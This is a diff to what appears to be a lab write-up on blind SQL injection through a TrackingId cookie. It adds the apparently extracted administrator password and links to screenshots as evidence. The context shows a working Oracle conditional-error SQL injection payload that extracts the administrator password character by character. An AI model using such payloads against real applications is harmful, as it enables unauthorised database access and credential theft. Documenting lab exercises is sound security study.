@@ -60,6 +60,9 @@ Exploit a blind SQL injection vulnerability in the `TrackingId` cookie to extrac
 ```sql
 '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
+```text
+4ty7g5fzix6hit156dyl
+```
 
 ## Vulnerability
 
@@ -79,5 +82,10 @@ An attacker could extract sensitive database information, including administrato
 
 ## Evidence
 
-<!-- Add Burp Suite screenshots showing conditional errors and Intruder results. -->
+<img width="555" height="407" alt="image" src="https://github.com/user-attachments/assets/4b79b894-61e9-4f95-8c68-040946f5cea7" />
+<img width="1437" height="787" alt="image" src="https://github.com/user-attachments/assets/c69e4450-e66b-4f06-b938-a2632d7c1786" />
+<img width="1570" height="262" alt="image" src="https://github.com/user-attachments/assets/bb5b1629-c2de-4fe6-a4a5-4a718b79c4b5" />
+
+
+
 
